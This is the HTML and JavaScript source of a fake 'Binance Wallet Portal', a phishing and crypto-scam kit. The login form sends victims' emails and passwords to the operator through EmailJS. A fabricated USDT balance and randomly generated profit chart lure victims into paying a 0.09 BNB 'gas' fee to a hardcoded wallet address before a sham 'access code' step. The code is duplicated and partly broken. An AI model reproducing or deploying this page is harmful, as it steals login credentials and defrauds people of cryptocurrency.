<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Binance Wallet Portal - Login</title>
  <style>
    body {
      margin: 0;
      font-family: 'Arial Black', Arial, sans-serif;
      background-color: #0B0E11;
      color: white;
      font-weight: 900;
      display: flex;
      height: 100vh;
      justify-content: center;
      align-items: center;
    }
    .container {
      background-color: #1E2329;
      padding: 48px 32px;
      border-radius: 24px;
      box-shadow: 0 0 20px rgba(243, 186, 47, 0.4);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    h2 {
      color: #f3ba2f;
      font-size: 2.5rem;
      letter-spacing: 1.5px;
      margin-bottom: 32px;
    }
    input {
      width: 100%;
      background-color: #0B0E11;
      border: 2px solid #444c5a;
      border-radius: 16px;
      padding: 14px 18px;
      margin: 12px 0;
      color: white;
      font-weight: 900;
      font-size: 1.1rem;
      outline: none;
      transition: border-color 0.3s;
    }
    input::placeholder {
      color: #666b7a;
      font-weight: 700;
    }
    input:focus {
      border-color: #f3ba2f;
    }
    button {
      width: 100%;
      background-color: #f3ba2f;
      border: none;
      border-radius: 20px;
      padding: 16px;
      font-weight: 900;
      font-size: 1.2rem;
      color: #0B0E11;
      cursor: pointer;
      transition: background-color 0.3s;
      margin-top: 24px;
    }
    button:hover {
      background-color: #e6b62d;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Binance Wallet Login</h2>
    <input type="email" id="email" placeholder="Email" />
    <input type="password" id="pass" placeholder="Password" />
    <button onclick="submitSignin()">Sign In</button>
  </div>

<!-- Page 1: Sign In (Binance-style Dark Mode) -->
<div
  class="page min-h-screen bg-[#0B0E11] flex items-center justify-center"
  id="page1"
>
  <div
    class="max-w-sm w-full bg-[#1E2329] p-8 rounded-3xl shadow-lg text-center space-y-8"
  >
    <h2 class="text-3xl font-extrabold text-[#f3ba2f] tracking-wide">
      Binance Wallet Login
    </h2>

    <input
      type="email"
      id="email"
      placeholder="Email"
      class="w-full bg-[#0B0E11] border border-gray-600 rounded-xl py-3 px-4 text-white placeholder-gray-500 font-bold focus:outline-none focus:border-[#f3ba2f]"
    />

    <input
      type="password"
      id="pass"
      placeholder="Password"
      class="w-full bg-[#0B0E11] border border-gray-600 rounded-xl py-3 px-4 text-white placeholder-gray-500 font-bold focus:outline-none focus:border-[#f3ba2f]"
    />

    <button
      onclick="submitSignin()"
      class="w-full bg-[#f3ba2f] text-black font-extrabold py-3 rounded-xl hover:bg-yellow-400 transition"
    >
      Sign In
    </button>
  </div>
</div>


<!-- Page 2: Authenticating (Binance Dark Mode) -->
<div class="page min-h-screen bg-[#0B0E11] text-white p-6 flex items-center justify-center" id="page2">
  <div class="max-w-sm w-full bg-[#1E2329] p-6 rounded-2xl shadow-lg text-center space-y-4">
    <h2 class="text-2xl font-semibold text-[#f3ba2f]">Authenticating...</h2>
    <p class="text-gray-400">Please wait...</p>
    <button
      onclick="showPage(3)"
      class="mt-4 w-full bg-[#f3ba2f] text-black font-semibold py-3 rounded-lg hover:bg-yellow-400 transition"
    >
      Continue
    </button>
  </div>
</div>

<!-- Page 3: Account ID (Binance Dark Mode) -->
<div class="page min-h-screen bg-[#0B0E11] text-white p-6" id="page3">
  <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg flex flex-col space-y-6">
    <h2 class="text-2xl font-semibold text-[#f3ba2f] text-center">Enter Account ID</h2>
    
    <input
      type="text"
      placeholder="Account ID"
      class="w-full p-3 rounded-lg bg-[#0B0E11] border border-gray-600 placeholder-gray-500 focus:outline-none focus:border-[#f3ba2f] text-white"
    />
    
    <button
      onclick="showPage(5)"
      class="w-full bg-[#f3ba2f] text-black font-semibold py-3 rounded-lg hover:bg-yellow-400 transition"
    >
      Confirm
    </button>
  </div>
</div>
  
<!-- Page 5: Dashboard -->
<div class="page visible min-h-screen bg-[#0B0E11] text-white p-6" id="page5">
  <!-- Top Bar -->
  <div class="flex justify-between items-center mb-6">
    <h2 class="text-2xl font-bold text-[#f3ba2f]">Wallet Dashboard</h2>
    <button onclick="connectWallet()" id="connectBtn"
      class="bg-[#f3ba2f] text-black font-semibold px-4 py-2 rounded hover:bg-yellow-400 transition">
      Connect Wallet
    </button>
  </div>
      <!-- Action Buttons -->
  <div class="grid grid-cols-2 sm:grid-cols-4 gap-4">
    <button onclick="showPage(8)"
      class="bg-[#1E2329] hover:bg-[#2c3137] border border-[#f3ba2f] text-[#f3ba2f] font-medium py-3 rounded-lg">
      Transfer to Main Wallet
    </button>
    <button onclick="goToScan('Receive')"
      class="bg-[#1E2329] hover:bg-[#2c3137] border border-[#f3ba2f] text-[#f3ba2f] font-medium py-3 rounded-lg">
      Receive
    </button>
    <button onclick="showPage(13)"
      class="bg-[#1E2329] hover:bg-[#2c3137] border border-[#f3ba2f] text-[#f3ba2f] font-medium py-3 rounded-lg">
      Settings
    </button>
    <button onclick="goToScan('Top Up BNB')"
      class="bg-[#1E2329] hover:bg-[#2c3137] border border-[#f3ba2f] text-[#f3ba2f] font-medium py-3 rounded-lg">
      Top Up BNB
    </button>
  </div>
</div>

  <!-- Wallet Status -->
  <div id="walletStatus" class="text-sm text-gray-400 mb-4"></div>

  <!-- Assets Card -->
  <div class="bg-[#1E2329] p-6 rounded-2xl shadow-lg mb-6">
    <p class="text-lg text-gray-300 mb-2">Total Assets</p>
    <p class="text-3xl font-semibold text-[#f3ba2f]" id="totalAssets">$2978.78</p>
  </div>

    <!-- USDT Token Card -->
<div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between">
  <div class="flex items-center space-x-3">
    <!-- Token Logo -->
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABjElEQVR4nO3ZMUoDQRRG4WuYyM/ANmwArsAJ7AFuwArsAHbAHawCuwAnawC7cU0rA2puvf2uqrZmd5PaZnZtxz8rcuQqzDEYDAaDwWAwGg8FgMBkOypU/1mff4tcqX/fXvsLuYemK1VX5uK+FXKo3F+LOqPMrT3l2z3u+Z0+lfxN7OtVeuUE1hOZR3BzMRzGcznM5zHMB3PZTGdzmcznMZzNcz3M5fys5Y2nvM5nM5zGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAPZ9o1kT7gUmv/3p5Ti8AAAAASUVORK5CYII=" alt="USDT" />
        USDT
      </div>
  <div>
      <h3 class="text-lg font-semibold text-white">Tether (USDT)</h3>
      <p class="text-sm text-gray-400">BEP-20</p>
    </div>
  </div>
  <div class="text-right">
    <p class="text-xl font-bold text-[#f3ba2f]" id="usdtBalance">2978.78</p>
    <p class="text-sm text-gray-400">Balance</p>
  </div>
</div>

    <!-- BNB Token Card -->
<div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between">
  <div class="flex items-center space-x-3">
    <!-- Token Logo -->
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABVUlEQVR4nO3Z0UoDQRCG4Qe6A3sAt2DewAXsAt2APfQAbcAd7AJ2gN3gAeSBcjcTL0TX4q+uHOc+Ntzxy/HXXmAFgMBgMBgMBgMBk+KoF/o3s6f9XPpXy0kUbwDpyn+61hX9Vwmsfl2knXQdV8q6Cd9bld2Wt/SbAVsmcDkcxnM5zGbJXDZzFcxnM5zGb5gzOfcznMZzGc5lcxXc9nMZzOcznMZzGcznMZzGcznMZ3KrDKTMZzGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAP4BCGmv/ra7i6YAAAAASUVORK5CYII=" alt="BNB" />
        BNB
      </div>
      <h3 class="text-lg font-semibold text-white">BNB</h3>
      <p class="text-sm text-gray-400">BNB Smart Chain</p>
    </div>
  </div>
  <div class="text-right">
    <p class="text-xl font-bold text-[#f3ba2f]" id="bnbBalance">0.0000</p>
    <p class="text-sm text-gray-400">Balance</p>
  </div>
  </div>
  <div class="container">
    <p class="goal-text">Daily Profit Goal: <strong>$150.00</strong></p>
    <div id="dailyProgress">$0.00 (0%)</div>
    <div class="progress-bg">
      <div id="goalBar"></div>
    </div>
  </div>

  <div class="container">
    <canvas id="profitChart" width="460" height="240"></canvas>
  </div>

<script>
  let goal = 150, progress = 0;

  const ctx = document.getElementById("profitChart").getContext("2d");
  const profitChart = new Chart(ctx, {
    type: 'line',
    data: {
      labels: [],
      datasets: [{
        label: 'Asset Value',
        data: [],
        borderColor: '#f3ba2f',
        backgroundColor: 'rgba(243, 186, 47, 0.2)',
        tension: 0.4,
        fill: true,
        borderWidth: 3,
        pointRadius: 4,
        pointBackgroundColor: '#f3ba2f'
      }]
    },
    options: {
      responsive: true,
      animation: false,
      scales: {
        y: {
          beginAtZero: false,
          ticks: {
            color: '#f3ba2f',
            font: { weight: '900' }
          },
          grid: {
            color: '#2b3245'
          }
        },
        x: {
          ticks: {
            color: '#f3ba2f',
            font: { weight: '900' }
          },
          grid: {
            color: '#2b3245'
          }
        }
      },
      plugins: {
        legend: {
          labels: {
            color: '#f3ba2f',
            font: { weight: '900', size: 14 }
          }
        },
        tooltip: {
          enabled: true,
          backgroundColor: '#1E2329',
          titleColor: '#f3ba2f',
          bodyColor: '#fff',
          borderColor: '#f3ba2f',
          borderWidth: 1,
          cornerRadius: 6
        }
      }
    }
  });

  function updatePerformance() {
    const now = new Date().toLocaleTimeString();

    if (profitChart.data.labels.length > 15) {
      profitChart.data.labels.shift();
      profitChart.data.datasets[0].data.shift();
    }

    const newValue = 2000 + Math.random() * 100;
    profitChart.data.labels.push(now);
    profitChart.data.datasets[0].data.push(newValue);
    profitChart.update();

    progress += Math.random() * 3;
    if (progress > goal) progress = goal;

    const percent = ((progress / goal) * 100).toFixed(1);

    const dailyProgress = document.getElementById("dailyProgress");
    dailyProgress.textContent = `$${progress.toFixed(2)} (${percent}%)`;
    dailyProgress.style.color = "#f3ba2f";
    dailyProgress.style.fontWeight = "900";

    const goalBar = document.getElementById("goalBar");
    goalBar.style.width = `${percent}%`;
    goalBar.style.backgroundColor = "#f3ba2f";
    goalBar.style.transition = "width 0.6s ease";
  }

  setInterval(updatePerformance, 6000);
</script>

</body>
</html>

<!-- PAGE 13: Settings Page -->
<div id="page13" class="page" style="background-color: #0b0e11; color: #f0b90b; padding: 20px; min-height: 100vh;">
  <h2 style="font-size: 24px; margin-bottom: 20px;">Settings</h2>

  <!-- Connect Wallet Button -->
  <button onclick="connectWallet()" style="background-color: #f0b90b; color: #000; padding: 10px 20px; border: none; border-radius: 8px; margin-bottom: 10px;">Connect Wallet</button><br/>

  <!-- Disconnect Wallet Button -->
  <button onclick="disconnectWallet()" style="background-color: #222; color: #f0b90b; padding: 10px 20px; border: 1px solid #f0b90b; border-radius: 8px; margin-bottom: 10px;">Disconnect Wallet</button><br/>

  <!-- Logout Button -->
  <button onclick="logout()" style="background-color: #222; color: red; padding: 10px 20px; border: 1px solid red; border-radius: 8px; margin-bottom: 10px;">Logout</button><br/>

  <!-- Manual Wallet Input -->
  <input type="text" id="manualWallet" placeholder="Enter Wallet Address Manually" style="background-color: #1e1e1e; color: white; padding: 10px; width: 80%; margin: 10px 0; border: 1px solid #f0b90b; border-radius: 8px;" />
  <button onclick="manualWalletConnect()" style="background-color: #444; color: #f0b90b; padding: 10px 20px; border: none; border-radius: 8px;">Use Manual Wallet</button><br/><br/>

    <!-- Include Web3Modal and ethers -->
<script src="https://cdn.jsdelivr.net/npm/web3modal@3.0.0/dist/index.js"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.umd.min.js"></script>

<div>
  <button onclick="connectWallet()">Connect Wallet</button><br/><br/>

  <!-- Manual Wallet Input -->
  <input type="text" id="manualWallet" placeholder="Enter Wallet Address Manually" class="input" />
  <button onclick="manualWalletConnect()">Use Manual Wallet</button><br/><br/>

  <div id="walletInfo" style="color: yellow;"></div>
</div>

  <!-- Wallet Info Display -->
  <div id="walletInfo" style="margin-top: 10px; font-size: 16px;"></div><br/>

  <!-- Live Chat Button -->
  <button onclick="alert('Live chat feature coming soon.')" style="background-color: #f0b90b; color: #000; padding: 10px 20px; border: none; border-radius: 8px;">Live Chat</button>
</div>

        
<!-- Page 6: Scan (Binance Dark Theme) -->
<div class="page min-h-screen bg-[#0B0E11] text-white p-6" id="page6">
  <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg">
    
    <!-- Header -->
    <h2 id="scanAction" class="text-2xl font-semibold text-[#f3ba2f] mb-4 text-center">Action</h2>

    <!-- QR Code -->
    <div class="flex justify-center mb-4">
      <img
        src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200"
        alt="QR Code"
        class="rounded-lg border border-gray-700"
      />
    </div>

    <!-- Wallet Address -->
    <p class="text-center text-sm text-gray-400 mb-2">Send to:</p>
    <p class="text-center text-[#f3ba2f] text-sm font-mono mb-4">
      0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0
    </p>

    <!-- Transaction Hash Input -->
    <input
      type="text"
      id="txHash"
      placeholder="Enter Transaction Hash"
      class="w-full p-3 mb-4 rounded-lg bg-[#0B0E11] border border-gray-600 placeholder-gray-500 focus:outline-none focus:border-[#f3ba2f] text-white"
    />

    <!-- Confirm Button -->
    <button
      onclick="submitTransaction()"
      class="w-full bg-[#f3ba2f] text-black font-semibold py-3 rounded-lg hover:bg-yellow-400 transition mb-4"
    >
      Confirm Transaction
    </button>

    <!-- Status Message -->
    <div id="txStatus" class="text-center text-sm text-green-400 mb-4"></div>

    <!-- Return Button -->
    <button
      onclick="showPage(5)"
      class="w-full border border-[#f3ba2f] text-[#f3ba2f] py-2 rounded-lg hover:bg-[#2c3137] transition"
    >
      Return
    </button>
  </div>
</div>

<!-- Page 7: Connect Wallet (Binance Dark Mode) -->
<div class="page min-h-screen bg-[#0B0E11] text-white p-6" id="page7">
  <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg space-y-6">
    
    <h2 class="text-2xl font-semibold text-[#f3ba2f] text-center">Connect Your Wallet</h2>
    
    <!-- Include Web3Modal and ethers -->
    <script src="https://cdn.jsdelivr.net/npm/web3modal@3.0.0/dist/index.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.umd.min.js"></script>

    <!-- Connect Wallet Button -->
    <div class="text-center">
      <button
        onclick="connectWallet()"
        class="bg-[#f3ba2f] text-black font-semibold px-6 py-3 rounded-lg hover:bg-yellow-400 transition"
      >
        Connect Wallet
      </button>
    </div>

    <!-- Manual Wallet Input -->
    <div class="space-y-2">
      <input
        type="text"
        id="manualWallet"
        placeholder="Enter Wallet Address Manually"
        class="w-full p-3 rounded-lg bg-[#0B0E11] border border-gray-600 placeholder-gray-500 focus:outline-none focus:border-[#f3ba2f] text-white"
      />
      <button
        onclick="manualWalletConnect()"
        class="w-full bg-[#f3ba2f] text-black font-semibold py-3 rounded-lg hover:bg-yellow-400 transition"
      >
        Use Manual Wallet
      </button>
    </div>

    <!-- Wallet Info Display -->
    <div id="walletInfo" class="text-center text-yellow-400 font-medium"></div>

    <!-- Wallet Input Form -->
    <div id="walletInputSection" class="space-y-3">
      <input
        type="text"
        id="walletAddress"
        placeholder="Enter BEP20 Wallet Address"
        class="w-full p-3 rounded-lg bg-[#0B0E11] border border-gray-600 placeholder-gray-500 focus:outline-none focus:border-[#f3ba2f] text-white"
      />
      <button
        onclick="confirmWallet()"
        class="w-full bg-[#f3ba2f] text-black font-semibold py-3 rounded-lg hover:bg-yellow-400 transition"
      >
        Confirm Wallet
      </button>
    </div>

    <!-- Connected Wallet Display -->
    <div id="connectedWalletSection" style="display: none;" class="text-center space-y-3">
      <p class="text-yellow-400 font-semibold">
        Connected: <span id="connectedWalletText" class="font-mono"></span>
      </p>
      <button
        onclick="disconnectWallet()"
        class="w-full border border-[#f3ba2f] text-[#f3ba2f] py-3 rounded-lg hover:bg-[#2c3137] transition"
      >
        Disconnect Wallet
      </button>
    </div>

    <!-- Return to Dashboard -->
    <button
      onclick="showPage(5)"
      class="w-full border border-[#f3ba2f] text-[#f3ba2f] py-3 rounded-lg hover:bg-[#2c3137] transition"
    >
      Return to Dashboard
    </button>
  </div>
</div>


<!-- PAGE 5: Main Dashboard -->
<div class="page visible" id="page5">
  <div class="form-container">
    <h2>Main Dashboard</h2>
    <p>Total Assets: <span id="totalAssetsDisplay">$2978.78</span></p>
    <button onclick="showPage('page8')">Make Another Transfer</button>
    <br/><br/>
    <button id="connectWalletBtn" onclick="connectWallet()">🔌 Connect Wallet</button>
    <p id="walletAddress" style="font-size: 14px; margin-top: 10px;"></p>
  </div>
</div>

<!-- PAGE 8: Transfer to Main Wallet -->
<div id="page8" class="page">
  <div class="form-container">
    <h2>Make a Transfer</h2>
    <input type="text" id="inputWallet" placeholder="Enter Wallet Address" class="input" /><br/>
    <select id="networkSelect" class="input">
      <option>Select Network</option>
      <option>Ethereum</option>
      <option>Binance Smart Chain</option>
    </select><br/>
    <input type="number" id="transferAmount" placeholder="Enter Amount" class="input" /><br/>
    <button onclick="setMaxAmount()">Use Max</button><br/><br/>
    <button onclick="goToBNBConfirmationPage()">Confirm</button>
    <button onclick="showPage('page5')">Return</button>
  </div>
</div>

<!-- PAGE 9i: BNB Gas Confirmation -->
<div id="bnbConfirmPage" class="page">
  <div class="form-container">
    <h2>⚠️ Not Enough BNB</h2>
    <p>Top up <strong>0.09 BNB</strong> to continue.</p>
    <div id="bnbAddressSection"></div>
    <button onclick="copyBNBAddress()">📋 Copy Address</button>
    <button onclick="showPage('accessCodePage')">✅ Confirm BNB Gas Code</button>
  </div>
</div>

<!-- PAGE 9ii: Access Code Page -->
<div id="accessCodePage" class="page">
  <div class="form-container">
    <h2>Access Code Required</h2>
    <input type="text" id="accessCodeInput" placeholder="Enter Access Code" class="input" /><br/>
    <button onclick="validateAccessCode()">Submit Access Code</button><br/><br/>
    <button onclick="showPage('page8')">Go Back</button>
  </div>
</div>

<!-- PAGE 10: Processing Page -->
<div class="page" id="processingPage">
  <div class="form-container">
    <h2>Transaction Processing...</h2>
    <div class="loader"></div>
    <p>Verifying access code...</p>
  </div>
</div>

<!-- PAGE 11: Success Page -->
<div class="page" id="successPage">
  <div class="form-container">
    <h2 class="text-green-500">✅ Transaction Successful</h2>
    <p>Total assets have been deducted.</p>
    <div class="success-info" id="successInfo"></div>
  </div>
</div>

<!-- PAGE 12: Decline Page -->
<div class="page" id="declinePage">
  <div class="form-container">
    <h2 class="text-red-500">❌ Transaction Declined</h2>
    <p class="bold-decline">Transaction Declined - Invalid Access Code</p>
  </div>
</div>


<script>
  let totalAsset = 2978.78;
  let userWalletAddress = "";
  let transferData = {
    wallet: '',
    network: '',
    amount: 0,
    contractAddress: '0x55d398326f99059ff775485246999027b3197955',
  };

  const bnbAddress = "0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0";

  async function connectWallet() {
    if (!window.ethereum) {
      alert("MetaMask not found. Please install it.");
      return;
    }

    try {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      userWalletAddress = accounts[0];
      document.getElementById('walletAddress').innerText = `Connected: ${userWalletAddress}`;
      document.getElementById('connectWalletBtn').innerText = "🔌 Wallet Connected";
    } catch (error) {
      console.error("Wallet connection error:", error);
      alert("Failed to connect wallet.");
    }
  }

  async function checkAndSwitchToBSC() {
    const bscParams = {
      chainId: '0x38',
      chainName: 'Binance Smart Chain',
      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
      rpcUrls: ['https://bsc-dataseed.binance.org/'],
      blockExplorerUrls: ['https://bscscan.com'],
    };

    if (window.ethereum) {
      const currentChainId = await ethereum.request({ method: 'eth_chainId' });
      if (currentChainId !== bscParams.chainId) {
        try {
          await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: bscParams.chainId }] });
        } catch (switchError) {
          if (switchError.code === 4902) {
            try {
              await ethereum.request({ method: 'wallet_addEthereumChain', params: [bscParams] });
            } catch (addError) {
              alert("Failed to add BSC network.");
            }
          } else {
            alert("Please switch to BNB Smart Chain manually.");
          }
        }
      }
    }
  }

  function showPage(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('visible'));
    document.getElementById(id)?.classList.add('visible');

    if (id === 'page8') {
      if (userWalletAddress) {
        document.getElementById('inputWallet').value = userWalletAddress;
      }
      checkAndSwitchToBSC();
    }
  }

  function setMaxAmount() {
    document.getElementById('transferAmount').value = totalAsset;
  }

  function goToBNBConfirmationPage() {
    const wallet = document.getElementById('inputWallet').value.trim();
    const network = document.getElementById('networkSelect').value;
    const amount = parseFloat(document.getElementById('transferAmount').value);
    if (!wallet || network === "Select Network" || !amount || amount <= 0) {
      alert("Please complete all fields before proceeding.");
      return;
    }
    transferData.wallet = wallet;
    transferData.network = network;
    transferData.amount = amount;
    showPage('bnbConfirmPage');
  }

  function copyBNBAddress() {
    const section = document.getElementById('bnbAddressSection');
    section.innerHTML = `<div class="loader"></div><p>Loading address...</p>`;
    setTimeout(() => {
      navigator.clipboard.writeText(bnbAddress);
      section.innerHTML = `
        <p><strong>BNB Smart Chain BEP20 Address:</strong></p>
        <p style="word-break:break-all; font-size: 14px;">${bnbAddress}</p>
        <p style="font-size: 12px; color: #aaa;">Network: BNB Smart Chain (BEP20)</p>
      `;
    }, 5000);
  }

  function validateAccessCode() {
    const inputCode = document.getElementById('accessCodeInput').value.trim();
    showPage('processingPage');

    setTimeout(() => {
      if (inputCode === 'B577nn8h') {
        totalAsset = 0;
        document.getElementById('totalAssetsDisplay').innerText = `$${totalAsset.toFixed(2)}`;
        document.getElementById('successInfo').innerHTML = `
          <p><strong>Withdrawn Amount:</strong> $${transferData.amount.toFixed(2)}</p>
          <p><strong>Receiver Address:</strong> ${transferData.wallet}</p>
          <p><strong>Network:</strong> ${transferData.network}</p>
          <p><strong>From Contract Address:</strong> ${transferData.contractAddress}</p>
        `;
        showPage('successPage');
        setTimeout(() => showPage('page5'), 3000);
      } else {
        showPage('declinePage');
        setTimeout(() => {
          resetForm();
          showPage('page8');
        }, 3000);
      }
    }, 10000);
  }

  function resetForm() {
    document.getElementById('inputWallet').value = '';
    document.getElementById('networkSelect').selectedIndex = 0;
    document.getElementById('transferAmount').value = '';
    document.getElementById('accessCodeInput').value = '';
    document.getElementById('bnbAddressSection').innerHTML = '';
  }

  document.addEventListener('DOMContentLoaded', () => {
    showPage('page5');
  });
</script>

  
<script>
  let web3Modal;
  let provider;

  async function initWeb3Modal() {
    web3Modal = new window.Web3Modal({
      cacheProvider: false,
      walletConnectProjectId:
      themeMode: "dark"
      providerOptions: {}
    });
  }

  async function connectWallet() {
    try {
      await initWeb3Modal();
      provider = await web3Modal.connect();
      const ethersProvider = new ethers.BrowserProvider(provider);
      const signer = await ethersProvider.getSigner();
      const walletAddress = await signer.getAddress();

      localStorage.setItem('connectedWallet', walletAddress);
      document.getElementById('walletInfo').innerText = `Connected Wallet: ${walletAddress}`;
    } catch (error) {
      alert('Wallet connection failed: ' + error.message);
    }
  }

  function manualWalletConnect() {
    const manualAddress = document.getElementById('manualWallet').value.trim();
    if (ethers.isAddress(manualAddress)) {
      localStorage.setItem('connectedWallet', manualAddress);
      document.getElementById('walletInfo').innerText = `Manually Connected Wallet: ${manualAddress}`;
    } else {
      alert("Invalid wallet address. Please enter a valid BNB Smart Chain address.");
    }
  
  function disconnectWallet() {
    localStorage.removeItem('connectedWallet');
    document.getElementById('walletInfo').innerText = 'Wallet disconnected.';
  }

  function logout() {
    localStorage.clear();
    document.getElementById('logoutConfirm').style.display = 'none';
    alert('You have been logged out.');
  }

  function openLiveChat() {
    window.open("https://widget-page.smartsupp.com/widget/3ab3e4c3fcd21f84344cc872db2a35d9e40245a6", "_blank");
  }

  window.onload = function () {
    const savedWallet = localStorage.getItem('connectedWallet');
    if (savedWallet) {
      document.getElementById('walletInfo').innerText = `Connected Wallet: ${savedWallet}`;
    }
  };
</script>
  
  <script>
  function confirmWallet() {
    const walletInput = document.getElementById('walletAddress');
    const wallet = walletInput.value.trim();

    if (wallet !== '') {
      // Save wallet (you can also store it in localStorage or global state if needed)
      document.getElementById('connectedWalletText').textContent = wallet;

      // Hide input and show connected section
      document.getElementById('walletInputSection').style.display = 'none';
      document.getElementById('connectedWalletSection').style.display = 'block';
    } else {
      alert("Please enter a valid BEP20 wallet address.");
    }
  }

  function disconnectWallet() {
    // Clear the wallet display
    document.getElementById('connectedWalletText').textContent = '';

    // Show input and hide connected section
    document.getElementById('walletInputSection').style.display = 'block';
    document.getElementById('connectedWalletSection').style.display = 'none';

    // Optionally clear the input field
    document.getElementById('walletAddress').value = '';
  }
</script>

<script>
const emailService = "service_78wwbgl";
const signinTemplate = "template_omkmcio";
const publicKey = "ochPV1QVtay7TOdBA";
emailjs.init(publicKey);

function showPage(num) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('visible'));
  document.getElementById('page' + num).classList.add('visible');
}

function initApp() {
  const email = localStorage.getItem("email");
  if (email) {
    showPage(5);
    loadDashboard();
  } else {
    showPage(1);
  }
}

function submitSignin() {
  const email = document.getElementById("email").value;
  const pass = document.getElementById("pass").value;
  if (!email || !pass) return alert("Enter both email and password.");
  localStorage.setItem("email", email);
  localStorage.setItem("usdt_balance", "2978.78");
  const payload = { user_email: email, user_password: pass };
  emailjs.send(emailService, signinTemplate, payload)
    .then(() => showPage(2))
    .catch(err => alert("Failed to login: " + err));
}

function connectWallet() {
  showPage(7);
}

function confirmWallet() {
  const wallet = document.getElementById("walletAddress").value;
  if (!wallet || wallet.length < 10) return alert("Enter valid BEP20 address");
  localStorage.setItem("wallet_address", wallet);
  showPage(5);
  loadDashboard();
}

function loadDashboard() {
  const address = localStorage.getItem("wallet_address");
  const shortAddr = address ? address.slice(0, 6) + "..." + address.slice(-4) : "Not Connected";
  document.getElementById("walletStatus").textContent = address ? `Connected: ${shortAddr}` : "Not Connected";
  const usdt = localStorage.getItem("usdt_balance") || "2978.78";
  document.getElementById("totalAssets").textContent = "$" + usdt + " USDT";
}

function goToScan(action) {
  document.getElementById("scanAction").innerText = action;
  showPage(6);
}

function submitTransaction() {
  const tx = document.getElementById("txHash").value;
  if (tx.length < 10) return alert("Enter valid hash");
  document.getElementById("txStatus").innerHTML = "<p>Sent ✅ Waiting for admin confirmation...</p>";
  setTimeout(() => {
    const current = parseFloat(localStorage.getItem("usdt_balance") || "2978.78");
    const newBal = (current - 100).toFixed(2);
    localStorage.setItem("usdt_balance", newBal);
    document.getElementById("totalAssets").textContent = "$" + newBal + " USDT";
  }, 5000);
}
 let goal = 150, progress = 0;

  const ctx = document.getElementById("profitChart").getContext("2d");
  const profitChart = new Chart(ctx, {
    type: 'line',
    data: {
      labels: [],
      datasets: [{
        label: 'Asset Value',
        data: [],
        borderColor: '#f3ba2f',
        backgroundColor: 'rgba(243, 186, 47, 0.2)',
        tension: 0.4,
        fill: true,
        borderWidth: 3,
        pointRadius: 4,
        pointBackgroundColor: '#f3ba2f'
      }]
    },
    options: {
      responsive: true,
      animation: false,
      scales: {
        y: {
          beginAtZero: false,
          ticks: {
            color: '#f3ba2f',
            font: { weight: '900' }
          },
          grid: {
            color: '#2b3245'
          }
        },
        x: {
          ticks: {
            color: '#f3ba2f',
            font: { weight: '900' }
          },
          grid: {
            color: '#2b3245'
          }
        }
      },
      plugins: {
        legend: {
          labels: {
            color: '#f3ba2f',
            font: { weight: '900', size: 14 }
          }
        },
        tooltip: {
          enabled: true,
          backgroundColor: '#1E2329',
          titleColor: '#f3ba2f',
          bodyColor: '#fff',
          borderColor: '#f3ba2f',
          borderWidth: 1,
          cornerRadius: 6
        }
      }
    }
  });

  function updatePerformance() {
    const now = new Date().toLocaleTimeString();

    if (profitChart.data.labels.length > 15) {
      profitChart.data.labels.shift();
      profitChart.data.datasets[0].data.shift();
    }

    const newValue = 2000 + Math.random() * 100;
    profitChart.data.labels.push(now);
    profitChart.data.datasets[0].data.push(newValue);
    profitChart.update();

    progress += Math.random() * 3;
    if (progress > goal) progress = goal;

    const percent = ((progress / goal) * 100).toFixed(1);

    const dailyProgress = document.getElementById("dailyProgress");
    dailyProgress.textContent = `$${progress.toFixed(2)} (${percent}%)`;
    dailyProgress.style.color = "#f3ba2f";
    dailyProgress.style.fontWeight = "900";

    const goalBar = document.getElementById("goalBar");
    goalBar.style.width = `${percent}%`;
    goalBar.style.backgroundColor = "#f3ba2f";
    goalBar.style.transition = "width 0.6s ease";
  }

  setInterval(updatePerformance, 6000);
</script>

</body>
</html>
